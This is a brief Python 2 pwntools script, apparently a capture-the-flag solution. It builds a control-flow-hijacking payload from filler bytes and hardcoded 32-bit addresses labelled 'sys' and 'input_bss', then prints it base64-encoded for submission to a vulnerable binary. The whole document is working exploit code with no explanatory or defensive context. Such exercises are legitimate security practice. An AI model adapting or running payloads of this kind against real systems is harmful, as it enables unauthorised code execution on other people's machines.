from pwn import *
from base64 import *

context.log_level = 'debug'

correct = 0x0804925F
sys = 0x08049284
input_bss = 0x0811EB40

pay = "AAAA" + p32(sys) + p32(input_bss)

print b64encode(pay)
